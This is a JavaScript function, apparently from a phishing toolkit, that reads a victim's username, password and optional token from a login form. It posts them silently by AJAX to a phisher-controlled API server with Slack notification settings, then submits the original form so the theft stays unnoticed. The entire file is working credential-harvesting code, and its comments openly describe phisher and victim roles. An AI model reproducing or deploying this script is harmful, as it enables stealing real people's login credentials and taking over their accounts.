function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInputID,PasswordInputID){
	// Phisher Controlled Variables
	var APIPortal = SubForm.arguments[0];
	var FormName = SubForm.arguments[1];
	var Project = SubForm.arguments[2];
	var SlackBotName = SubForm.arguments[3];
	var SlackEmoji = SubForm.arguments[4];
	var UsernameInputID = SubForm.arguments[5];
	var PasswordInputID = SubForm.arguments[6];
	// Vistim Controlled Variables
	var Username = document.getElementById(UsernameInputID).value;
	var Password = document.getElementById(PasswordInputID).value;
	var Token = document.getElementById("token");
    if(Token){
        var Token = Token.value;
    } else {
		Token = "";
	}

    $.ajax({
        // Post Transparent AJAX Request to PhishAPI Server
		url:APIPortal,
        type:'post',
		data:'project='+Project+'&username='+Username+'&password='+Password+'&token='+Token+'&slackbotname='+SlackBotName+'&slackemoji='+SlackEmoji,
        success:function (){		
				// Submit Original Form
				var x = document.getElementsByName(FormName);
				x[0].submit();
        }
    });

}
